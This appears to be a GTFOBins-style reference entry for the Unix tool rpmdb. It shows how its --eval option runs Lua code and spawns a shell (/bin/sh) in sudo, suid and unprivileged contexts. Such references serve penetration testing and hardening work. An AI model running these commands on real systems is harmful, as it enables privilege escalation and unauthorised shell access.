---
type: gtfobin
name: rpmdb
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# rpmdb

## inherit

```bash
rpmdb --eval '%{lua:...}'
```
_This allows to run Lua code (`...`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
rpmdb --eval '%(/bin/sh 1>&2)'
```
**Contexts:** sudo, suid, unprivileged
